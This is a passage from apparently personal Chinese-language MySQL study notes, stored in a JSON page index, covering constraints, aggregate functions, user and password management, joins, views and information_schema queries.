值，每个表只能有一个主键\n例如\nCREATE TABLE abc(id int NOT NULL,PRIMARY KEY(id));\nNOT NULL 约束某列不能存储NULL值，约束字段要包含值，如果不为字段添加值，则无法更新或者插入新的值\n例如：\nCREATE TABLE abc(id int NOT NULL);\nUNIQUE 约束唯一标识数据库表中的每条记录\n例如： CREATE TABLE abc(id int NOT NULL,UNIQUE(id));\nFOREIGN KEY 约束一个表的值指向另一个表的唯一标识，防止非法数据插入，必须是其指向的表中的值\n例如： CREATE TABLE abc(id int NOT NULL,home int,PRIMARY KEY (Id),FOREIGN KEY (home) REFERENCES Persons(home));\nALTER TABLE 子表名 ADD CONSTRAINT 约束名 FOREIGN KEY(子表名字段) REFERENCES 父表名(字段);\nDEFAULT 约束向列中插入默认值，确保列中始终有值，而不是NULL值\n例如： CREATE TABLE abc(id int DEFAULT \u0026lsquo;0\u0026rsquo;);\nCHECK 约束限制列中的值的范围，当向单个列约束时，那么该列只允许特定的值，当向一个表约束时，那么该约束只会在特定的列中对值进行限制\n例如：\nCREATE TABLE abc(id int NOT NULL,CHECK(id \u0026gt;0));\n添加表级约束 例如：\nALTER TABLE 表名 add UNIQUE(home);\n添加表，列级约束\nALTER TABLE 表名 modify id int NOT NULL\n移除外建约束\nALTER TABLE 表名 DROP FOREIGN KEY 约束名;\nmysql 函数\n使用方法，例如：\nSELECT 函数(字段) FROM 数据表;\nCOUNT() 计数\nSUM() 求和\nAVG() 平均\nMAX() 最大\nMIN() 最小\nCOUNT() 返回表的记录数\n创建用户，删除用户，修改用户\n创建用户\nGRANT ALL PRIVILEGES ON . TO \u0026lsquo;a1\u0026rsquo;@\u0026rsquo;%\u0026rsquo; IDENTIFIED BY \u0026lsquo;123456\u0026rsquo; WITH GRANT OPTION;\nGRANT ALL PRIVILEGES ON . TO \u0026lsquo;a1\u0026rsquo;@\u0026rsquo;%\u0026rsquo; IDENTIFIED BY \u0026lsquo;123456\u0026rsquo; WITH GRANT OPTION;\nINSERT INTO mysql.user(Host,User,Password,ssl_cipher,x509_issuer,x509_subject,authentication_string) VALUES(\u0026quot;%\u0026quot;,\u0026ldquo;a3\u0026rdquo;,password(\u0026ldquo;123456\u0026rdquo;),\u0026lsquo;y\u0026rsquo;,\u0026lsquo;y\u0026rsquo;,\u0026lsquo;y\u0026rsquo;,\u0026lsquo;y\u0026rsquo;);\n删除用户\nDROP USER \u0026lsquo;a1\u0026rsquo;@\u0026rsquo;%\u0026rsquo;;\nDELETE FROM user WHERE user=\u0026lsquo;a2\u0026rsquo; AND host=\u0026rsquo;%\u0026rsquo;;\n修改用户密码\n管理员修改\nUPDATE mysql.user SET password=password(\u0026lsquo;123\u0026rsquo;) WHERE user=\u0026lsquo;a3\u0026rsquo; AND host=\u0026rsquo;%\u0026rsquo;;\nSET password FOR \u0026lsquo;a1\u0026rsquo;@\u0026rsquo;%\u0026rsquo;=password(\u0026ldquo;123\u0026rdquo;);\nroot修改\nGRANT ALL ON . TO \u0026lsquo;a3\u0026rsquo;@\u0026rsquo;%\u0026rsquo; IDENTIFIED BY \u0026lsquo;123\u0026rsquo;;\nUPDATE mysql.user SET authentication_string=password(\u0026lsquo;123\u0026rsquo;) WHERE user =\u0026lsquo;a1\u0026rsquo;;\n普通用户修改（普通用户只能修改自己的密码）\nSET password=password(\u0026lsquo;123\u0026rsquo;);\n连接\n当想要输出一段数据，但是里面的数据来自不同的表\n内连接\nSELECT 别名1.id,别名1.name,别名1.id_name别名2.score FROM 表名1 别名1 INNER JOIN 表名2 别名2 ON 别名1.id_name = 别名2.id;\n外连接\nSELECT 别名1.id,别名1.name,别名1.id_name别名2.score FROM 表名1 别名1 RIGHT OUTER JOIN 表名2 别名2 ON 别名1.id_name = 别名2.id;\n内连接和外连接的区别是内连接只返回两个表同时存在的数据，外连接（RIGHT OUTER JOIN）只返回右表都存在的行，外连接（LEFT OUTER JOIN）只返回左表都存在的行\nINNER JOIN是选出两张表都存在的记录，LEFT OUTER JOIN是选出左表存在的记录，RIGHT OUTER JOIN是选出右表存在的记录，FULL OUTER JOIN则是选出左右表都存在的记录\n视图\nCREATE VIEW 视图名(字段1,字段2,字段3) AS SELECT 字段1,字段2,字段3 FROM 表名;\nSELECT * FROM 视图名; // 输出视图的数据\n可以理解为将表的指定字段来插入到一个“虚拟的表”，视图的字段名和表的字段名可以不一样，用户就查询不到原来的表的结构和接触不了实质上的表\n查询视图\nDESCRIBE 视图名；\n在多表上创建视图\nCREATE VIEW 视图名 AS SELECT 字段1,字段2,字段3 FROM 表名1 别名1,表名2 别名2 WHERE 别名1.字段1 = 别名2.字段1 AND 别名2.字段2 = 别名1.字段2 ;\n查看当前mysql版本\nSELECT VERSION();\n查看当前数据库的用户\nSELECT USER();\n查看数据库的存储路径\nSELECT @@DATADIR;\n查看mysql的安装路径\nSELECT @@BASEDIR\n查看mysql的安装操作系统\nSELECT @@VERSION_COMPILE_OS\n初始数据库默认有4个，其中information_schema是保存着mysql服务器所维护的其他数据库的信息，例如数据库表，数据库名，表的数据类型，以及数据库的权限等等\n其中information_schema有73个表，其中最重要的有3个，分别是SCHEMATA和TABLES，以及COLUMNS\nSCHEMATA表存储了当前mysql中存储的数据库的信息，指令SHOW DATABASES;的结果来自于该表\nTABLES表存储了数据库中的表的信息（视图的信息也存储在该表）\nCOLUMNS表存储了表的列信息\n通过information_schema表来查询\n查询有什么数据库\nSELECT * FROM information_schema.SCHEMATA;\n查询hallo数据库有什么数据表\nSELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA=\u0026ldquo;hallo\u0026rdquo;;\n查询hallo数据表有哪些列\nSELECT * FROM information_schema.COLUMNS WHERE TABLE_NAME=\u0026ldquo;hallo\u0026rdquo;;\nmysql数据库是mysql的核心，其中存储了数据库的用户，权限设置，关键字等等所需要使用和管理的数据\nperformance_schema数据库存储了mysql服务器运行期间的状态信息，例如执行了那些语句，内存使用了多少等等\nsys数据库主要是通过视图的形式将数据库的数据汇总，可用来性能调优和诊断\nUNION操作符可以将多个（2个以上）SELECT语句合并在一起，如果出现重复的数据会被忽略（唯一性）\n例如：\nSELECT id FROM test UNION SELECT id FROM test1 ORDER BY id;\n如果需要输出重复的数据，可以使用UNION ALL\n","permalink":"https://99999.fun/posts/20/","summary":"推荐使用mariaDB\n操作数据库\n创建数据库\nCREATE DATABASE xxx;\n删除数据库\nDROP DATABASE xxx;\n查看所有数据库\nSHOW DATABASES;\n查看指定数据库\nSHOW xxx;\n打开指定数据库\nUSE xxx;\n查看指定数据库的详细信息\nSHOW CREATE DATABASE xxx;\n修改指定数据库的字符集\nALTER DATABASE xxx CHARACTER SET gbk COLLATE gbk_bin;\n数据表的校对规则，与于指定数据集如何排序\nCOLLATE=utf8_bin\n指定字符集\nCHARSET=utf8\n查看当前mysql所支持的字符集\nSHOW CHARACTER SET;\n新建数据表\nCREATE TABLE xxx(\rid int(4),\remail char(20),\rstatus int(2),\rcode varchar(10)\r​ );\n添加数据\nINSERT INTO xxx VALUES(\r1,\r\u0026quot;hallo\u0026quot;,\r\u0026quot;1\u0026quot;,\r\u0026quot;xxx\u0026quot;\r);\r修改数据(根据条件)\nUPDATE xxx SET status=1 WHERE id = 4;","title":"MySQL学习笔记"}]